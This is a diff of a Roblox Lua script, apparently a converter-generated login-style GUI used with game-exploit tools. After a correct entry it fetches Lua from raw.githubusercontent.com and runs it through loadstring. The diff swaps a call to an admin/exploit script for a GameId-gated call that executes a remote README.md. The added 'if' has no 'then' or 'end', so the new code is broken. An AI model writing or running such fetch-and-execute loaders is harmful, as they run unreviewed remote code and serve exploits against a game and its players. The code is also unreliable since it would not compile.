@@ -185,7 +185,7 @@ nameTXT_3.TextSize = 20.000
 
 -- Scripts:
 
-local function EAQOI_fake_script() -- Title.LocalScript 
+local function YRPFXEB_fake_script() -- Title.LocalScript 
 	local script = Instance.new('LocalScript', Title)
 
 	local amongus = script.Parent.elements.title
@@ -198,7 +198,8 @@ local function EAQOI_fake_script() -- Title.LocalScript
 			correct:TweenPosition(UDim2.new(0.024, 0,0.844, 0), "Out", "Back", 1, true)
 			wait(2)
 			correct:TweenPosition(UDim2.new(-0.25, 0,0.844, 0), "In", "Back", 1, true)
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua", true))()
+			if game.GameId == 3295514368
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/alfanius/Sandhurst/main/README.md", true))()
 			wait(1)
 			script.Parent.Parent:Destroy()
 		else
@@ -208,4 +209,4 @@ local function EAQOI_fake_script() -- Title.LocalScript
 		end
 	end)
 end
-coroutine.wrap(EAQOI_fake_script)()
+coroutine.wrap(YRPFXEB_fake_script)()
